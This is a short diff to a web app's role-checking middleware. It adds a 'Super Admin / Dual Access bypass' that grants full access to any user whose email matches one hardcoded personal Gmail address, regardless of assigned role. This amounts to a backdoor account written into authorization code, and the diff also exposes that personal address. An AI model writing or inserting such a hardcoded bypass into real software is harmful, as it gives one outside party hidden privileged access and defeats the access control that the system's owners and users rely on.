@@ -12,9 +12,18 @@ export function requireRole(...roles) {
     if (!req.user) {
       return res.status(401).json({ error: 'Authentication required' });
     }
-    if (!flatRoles.includes(req.user.role) && req.user.role !== 'ADMIN') {
+
+    // Super Admin / Dual Access bypass
+    const isSuper = Boolean(
+      req.user.isSuperAdmin ||
+      req.user.role === 'ADMIN' ||
+      req.user.email?.toLowerCase() === 'sababsanjid2@gmail.com'
+    );
+
+    if (!flatRoles.includes(req.user.role) && !isSuper) {
       return res.status(403).json({ error: 'Forbidden: Insufficient permissions for this portal' });
     }
+
     next();
   };
 }
